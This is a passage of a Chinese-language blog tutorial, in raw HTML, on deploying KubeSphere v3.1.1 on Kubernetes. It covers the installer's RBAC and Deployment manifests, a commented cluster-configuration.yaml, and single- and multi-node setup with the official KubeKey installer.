class="bullet">-</span> <span class="string">admissionregistration.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">policy</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">autoscaling</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">networking.istio.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">config.istio.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">iam.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">notification.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">auditing.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">events.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">core.kubefed.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">installer.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">storage.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">security.istio.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">monitoring.kiali.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">kiali.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">networking.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">kubeedge.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">types.kubefed.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubesphere-system</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubesphere-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">ks-install</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">ks-install</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">ks-install</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">ks-installer</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">installer</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">kubesphere/ks-installer:v3.1.1</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">&quot;Always&quot;</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">1Gi</span></span><br><span class="line">          <span class="attr">requests:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">20m</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">100Mi</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/localtime</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">host-time</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/etc/localtime</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">host-time</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2、cluster-configuration-yaml"><a href="#2、cluster-configuration-yaml" class="headerlink" title="2、cluster-configuration.yaml"></a>2、cluster-configuration.yaml</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">installer.kubesphere.io/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterConfiguration</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubesphere-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v3.1.1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">persistence:</span></span><br><span class="line">    <span class="attr">storageClass:</span> <span class="string">&quot;&quot;</span>        <span class="comment"># If there is no default StorageClass in your cluster, you need to specify an existing StorageClass here.</span></span><br><span class="line">  <span class="attr">authentication:</span></span><br><span class="line">    <span class="attr">jwtSecret:</span> <span class="string">&quot;&quot;</span>           <span class="comment"># Keep the jwtSecret consistent with the Host Cluster. Retrieve the jwtSecret by executing &quot;kubectl -n kubesphere-system get cm kubesphere-config -o yaml | grep -v &quot;apiVersion&quot; | grep jwtSecret&quot; on the Host Cluster.</span></span><br><span class="line">  <span class="attr">local_registry:</span> <span class="string">&quot;&quot;</span>        <span class="comment"># Add your private registry address if it is needed.</span></span><br><span class="line">  <span class="attr">etcd:</span></span><br><span class="line">    <span class="attr">monitoring:</span> <span class="literal">true</span>       <span class="comment"># Enable or disable etcd monitoring dashboard installation. You have to create a Secret for etcd before you enable it.</span></span><br><span class="line">    <span class="attr">endpointIps:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span>  <span class="comment"># etcd cluster EndpointIps. It can be a bunch of IPs here.</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">2379</span>              <span class="comment"># etcd port.</span></span><br><span class="line">    <span class="attr">tlsEnable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">common:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">openldap:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">minioVolumeSize:</span> <span class="string">20Gi</span> <span class="comment"># Minio PVC size.</span></span><br><span class="line">    <span class="attr">openldapVolumeSize:</span> <span class="string">2Gi</span>   <span class="comment"># openldap PVC size.</span></span><br><span class="line">    <span class="attr">redisVolumSize:</span> <span class="string">2Gi</span> <span class="comment"># Redis PVC size.</span></span><br><span class="line">    <span class="attr">monitoring:</span></span><br><span class="line">      <span class="comment"># type: external   # Whether to specify the external prometheus stack, and need to modify the endpoint at the next line.</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">http://prometheus-operated.kubesphere-monitoring-system.svc:9090</span> <span class="comment"># Prometheus endpoint to get metrics data.</span></span><br><span class="line">    <span class="attr">es:</span>   <span class="comment"># Storage backend for logging, events and auditing.</span></span><br><span class="line">      <span class="comment"># elasticsearchMasterReplicas: 1   # The total number of master nodes. Even numbers are not allowed.</span></span><br><span class="line">      <span class="comment"># elasticsearchDataReplicas: 1     # The total number of data nodes.</span></span><br><span class="line">      <span class="attr">elasticsearchMasterVolumeSize:</span> <span class="string">4Gi</span>   <span class="comment"># The volume size of Elasticsearch master nodes.</span></span><br><span class="line">      <span class="attr">elasticsearchDataVolumeSize:</span> <span class="string">20Gi</span>    <span class="comment"># The volume size of Elasticsearch data nodes.</span></span><br><span class="line">      <span class="attr">logMaxAge:</span> <span class="number">7</span>                     <span class="comment"># Log retention time in built-in Elasticsearch. It is 7 days by default.</span></span><br><span class="line">      <span class="attr">elkPrefix:</span> <span class="string">logstash</span>              <span class="comment"># The string making up index names. The index name will be formatted as ks-&lt;elk_prefix&gt;-log.</span></span><br><span class="line">      <span class="attr">basicAuth:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="attr">externalElasticsearchUrl:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="attr">externalElasticsearchPort:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">console:</span></span><br><span class="line">    <span class="attr">enableMultiLogin:</span> <span class="literal">true</span>  <span class="comment"># Enable or disable simultaneous logins. It allows different users to log in with the same account at the same time.</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">30880</span></span><br><span class="line">  <span class="attr">alerting:</span>                <span class="comment"># (CPU: 0.1 Core, Memory: 100 MiB) It enables users to customize alerting policies to send messages to receivers in time with different time intervals and alerting levels to choose from.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>         <span class="comment"># Enable or disable the KubeSphere Alerting System.</span></span><br><span class="line">    <span class="comment"># thanosruler:</span></span><br><span class="line">    <span class="comment">#   replicas: 1</span></span><br><span class="line">    <span class="comment">#   resources: &#123;&#125;</span></span><br><span class="line">  <span class="attr">auditing:</span>                <span class="comment"># Provide a security-relevant chronological set of records，recording the sequence of activities happening on the platform, initiated by different tenants.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>         <span class="comment"># Enable or disable the KubeSphere Auditing Log System. </span></span><br><span class="line">  <span class="attr">devops:</span>                  <span class="comment"># (CPU: 0.47 Core, Memory: 8.6 G) Provide an out-of-the-box CI/CD system based on Jenkins, and automated workflow tools including Source-to-Image &amp; Binary-to-Image.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>             <span class="comment"># Enable or disable the KubeSphere DevOps System.</span></span><br><span class="line">    <span class="attr">jenkinsMemoryLim:</span> <span class="string">2Gi</span>      <span class="comment"># Jenkins memory limit.</span></span><br><span class="line">    <span class="attr">jenkinsMemoryReq:</span> <span class="string">1500Mi</span>   <span class="comment"># Jenkins memory request.</span></span><br><span class="line">    <span class="attr">jenkinsVolumeSize:</span> <span class="string">8Gi</span>     <span class="comment"># Jenkins volume size.</span></span><br><span class="line">    <span class="attr">jenkinsJavaOpts_Xms:</span> <span class="string">512m</span>  <span class="comment"># The following three fields are JVM parameters.</span></span><br><span class="line">    <span class="attr">jenkinsJavaOpts_Xmx:</span> <span class="string">512m</span></span><br><span class="line">    <span class="attr">jenkinsJavaOpts_MaxRAM:</span> <span class="string">2g</span></span><br><span class="line">  <span class="attr">events:</span>                  <span class="comment"># Provide a graphical web console for Kubernetes Events exporting, filtering and alerting in multi-tenant Kubernetes clusters.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>         <span class="comment"># Enable or disable the KubeSphere Events System.</span></span><br><span class="line">    <span class="attr">ruler:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">logging:</span>                 <span class="comment"># (CPU: 57 m, Memory: 2.76 G) Flexible logging functions are provided for log query, collection and management in a unified console. Additional log collectors can be added, such as Elasticsearch, Kafka and Fluentd.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>         <span class="comment"># Enable or disable the KubeSphere Logging System.</span></span><br><span class="line">    <span class="attr">logsidecar:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">metrics_server:</span>                    <span class="comment"># (CPU: 56 m, Memory: 44.35 MiB) It enables HPA (Horizontal Pod Autoscaler).</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span>                   <span class="comment"># Enable or disable metrics-server.</span></span><br><span class="line">  <span class="attr">monitoring:</span></span><br><span class="line">    <span class="attr">storageClass:</span> <span class="string">&quot;&quot;</span>                 <span class="comment"># If there is an independent StorageClass you need for Prometheus, you can specify it here. The default StorageClass is used by default.</span></span><br><span class="line">    <span class="comment"># prometheusReplicas: 1          # Prometheus replicas are responsible for monitoring different segments of data source and providing high availability.</span></span><br><span class="line">    <span class="attr">prometheusMemoryRequest:</span> <span class="string">400Mi</span>   <span class="comment"># Prometheus request memory.</span></span><br><span class="line">    <span class="attr">prometheusVolumeSize:</span> <span class="string">20Gi</span>       <span class="comment"># Prometheus PVC size.</span></span><br><span class="line">    <span class="comment"># alertmanagerReplicas: 1          # AlertManager Replicas.</span></span><br><span class="line">  <span class="attr">multicluster:</span></span><br><span class="line">    <span class="attr">clusterRole:</span> <span class="string">none</span>  <span class="comment"># host | member | none  # You can install a solo cluster, or specify it as the Host or Member Cluster.</span></span><br><span class="line">  <span class="attr">network:</span></span><br><span class="line">    <span class="attr">networkpolicy:</span> <span class="comment"># Network policies allow network isolation within the same cluster, which means firewalls can be set up between certain instances (Pods).</span></span><br><span class="line">      <span class="comment"># Make sure that the CNI network plugin used by the cluster supports NetworkPolicy. There are a number of CNI network plugins that support NetworkPolicy, including Calico, Cilium, Kube-router, Romana and Weave Net.</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># Enable or disable network policies.</span></span><br><span class="line">    <span class="attr">ippool:</span> <span class="comment"># Use Pod IP Pools to manage the Pod network address space. Pods to be created can be assigned IP addresses from a Pod IP Pool.</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">calico</span> <span class="comment"># Specify &quot;calico&quot; for this field if Calico is used as your CNI plugin. &quot;none&quot; means that Pod IP Pools are disabled.</span></span><br><span class="line">    <span class="attr">topology:</span> <span class="comment"># Use Service Topology to view Service-to-Service communication based on Weave Scope.</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">none</span> <span class="comment"># Specify &quot;weave-scope&quot; for this field to enable Service Topology. &quot;none&quot; means that Service Topology is disabled.</span></span><br><span class="line">  <span class="attr">openpitrix:</span> <span class="comment"># An App Store that is accessible to all platform tenants. You can use it to manage apps across their entire lifecycle.</span></span><br><span class="line">    <span class="attr">store:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># Enable or disable the KubeSphere App Store.</span></span><br><span class="line">  <span class="attr">servicemesh:</span>         <span class="comment"># (0.3 Core, 300 MiB) Provide fine-grained traffic management, observability and tracing, and visualized traffic topology.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>     <span class="comment"># Base component (pilot). Enable or disable KubeSphere Service Mesh (Istio-based).</span></span><br><span class="line">  <span class="attr">kubeedge:</span>          <span class="comment"># Add edge nodes to your cluster and deploy workloads on edge nodes.</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>   <span class="comment"># Enable or disable KubeEdge.</span></span><br><span class="line">    <span class="attr">cloudCore:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span> &#123;<span class="attr">&quot;node-role.kubernetes.io/worker&quot;:</span> <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">      <span class="attr">tolerations:</span> []</span><br><span class="line">      <span class="attr">cloudhubPort:</span> <span class="string">&quot;10000&quot;</span></span><br><span class="line">      <span class="attr">cloudhubQuicPort:</span> <span class="string">&quot;10001&quot;</span></span><br><span class="line">      <span class="attr">cloudhubHttpsPort:</span> <span class="string">&quot;10002&quot;</span></span><br><span class="line">      <span class="attr">cloudstreamPort:</span> <span class="string">&quot;10003&quot;</span></span><br><span class="line">      <span class="attr">tunnelPort:</span> <span class="string">&quot;10004&quot;</span></span><br><span class="line">      <span class="attr">cloudHub:</span></span><br><span class="line">        <span class="attr">advertiseAddress:</span> <span class="comment"># At least a public IP address or an IP address which can be accessed by edge nodes must be provided.</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;&quot;</span>            <span class="comment"># Note that once KubeEdge is enabled, CloudCore will malfunction if the address is not provided.</span></span><br><span class="line">        <span class="attr">nodeLimit:</span> <span class="string">&quot;100&quot;</span></span><br><span class="line">      <span class="attr">service:</span></span><br><span class="line">        <span class="attr">cloudhubNodePort:</span> <span class="string">&quot;30000&quot;</span></span><br><span class="line">        <span class="attr">cloudhubQuicNodePort:</span> <span class="string">&quot;30001&quot;</span></span><br><span class="line">        <span class="attr">cloudhubHttpsNodePort:</span> <span class="string">&quot;30002&quot;</span></span><br><span class="line">        <span class="attr">cloudstreamNodePort:</span> <span class="string">&quot;30003&quot;</span></span><br><span class="line">        <span class="attr">tunnelNodePort:</span> <span class="string">&quot;30004&quot;</span></span><br><span class="line">    <span class="attr">edgeWatcher:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span> &#123;<span class="attr">&quot;node-role.kubernetes.io/worker&quot;:</span> <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">      <span class="attr">tolerations:</span> []</span><br><span class="line">      <span class="attr">edgeWatcherAgent:</span></span><br><span class="line">        <span class="attr">nodeSelector:</span> &#123;<span class="attr">&quot;node-role.kubernetes.io/worker&quot;:</span> <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="attr">tolerations:</span> []</span><br></pre></td></tr></table></figure>

<h2 id="Linux单节点部署KubeSphere"><a href="#Linux单节点部署KubeSphere" class="headerlink" title="Linux单节点部署KubeSphere"></a><strong>Linux单节点部署KubeSphere</strong></h2><h3 id="一、开通服务器"><a href="#一、开通服务器" class="headerlink" title="一、开通服务器"></a>一、开通服务器</h3><p><code>4c8g；centos7.9；防火墙放行  30000~32767；指定hostname</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname node1</span><br></pre></td></tr></table></figure>

<h3 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h3><h4 id="1-准备kubekey"><a href="#1-准备kubekey" class="headerlink" title="1.准备kubekey"></a>1.准备kubekey</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KKZONE=cn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x kk</span><br></pre></td></tr></table></figure>

<h4 id="2、使用KubeKey引导安装集群"><a href="#2、使用KubeKey引导安装集群" class="headerlink" title="2、使用KubeKey引导安装集群"></a>2、使用KubeKey引导安装集群</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可能需要下面命令</span></span><br><span class="line">yum install -y conntrack</span><br><span class="line"></span><br><span class="line">./kk create cluster --with-kubernetes v1.20.4 --with-kubesphere v3.1.1</span><br></pre></td></tr></table></figure>

<h4 id="3、安装后开启功能"><a href="#3、安装后开启功能" class="headerlink" title="3、安装后开启功能"></a>3、安装后开启功能</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631525467822-eb4ae77a-b77b-4c4b-81b6-b0275d18f33d.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_49,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<h2 id="Linux多节点部署KubeSphere"><a href="#Linux多节点部署KubeSphere" class="headerlink" title="Linux多节点部署KubeSphere"></a><strong>Linux多节点部署KubeSphere</strong></h2><h3 id="一-准备三台服务器"><a href="#一-准备三台服务器" class="headerlink" title="一.准备三台服务器"></a>一.准备三台服务器</h3><ul>
<li>4c8g （master）</li>
<li>8c16g * 2（worker）</li>
<li>centos7.9</li>
<li>内网互通</li>
<li>每个机器有自己域名</li>
<li>防火墙开放30000~32767端口</li>
</ul>
<h3 id="二-使用kuberkey创建集群"><a href="#二-使用kuberkey创建集群" class="headerlink" title="二.使用kuberkey创建集群"></a>二.使用kuberkey创建集群</h3><h4 id="1-下载kubekey"><a href="#1-下载kubekey" class="headerlink" title="1.下载kubekey"></a>1.下载kubekey</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KKZONE=cn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.1.1 sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x kk</span><br></pre></td></tr></table></figure>

<h4 id="2-创建集群配置文件"><a href="#2-创建集群配置文件" class="headerlink" title="2.创建集群配置文件"></a>2.创建集群配置文件</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./kk create config --with-kubernetes v1.20.4 --with-kubesphere v3.1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3、创建集群"><a href="#3、创建集群" class="headerlink" title="3、创建集群"></a>3、创建集群</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./kk create cluster -f config-sample.yaml</span><br></pre></td></tr></table></figure>

<h4 id="4、查看进度"><a href="#4、查看进度" class="headerlink" title="4、查看进度"></a>4、查看进度</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=<span class="string">&#x27;&#123;.items[0].metadata.name&#125;&#x27;</span>) -f</span><br></pre></td></tr></table></figure>

<h1 id="KubeSphere实战"><a href="#KubeSphere实战" class="headerlink" title="KubeSphere实战"></a><strong>KubeSphere实战</strong></h1><h2 id="多租户系统实战"><a href="#多租户系统实战" class="headerlink" title="多租户系统实战"></a><strong>多租户系统实战</strong></h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631589337850-64ced113-11ed-4c25-99b0-5b101995cecf.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_97,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p>
<ul>
<li>集群</li>
<li>企业空间</li>
<li>项目</li>
</ul>
<h2 id="中间件部署实战"><a href="#中间件部署实战" class="headerlink" title="中间件部署实战"></a>中间件部署实战</h2><p><code>应用部署需要关注的信息【应用部署三要素】</code></p>
<p><code>1、应用的部署方式</code></p>
<p><code>2、应用的数据挂载（数据，配置文件）</code></p>
<p><code>3、应用的可访问性</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631603837148-120309a6-5fac-4467-a585-eb8971c7640f.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_43,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
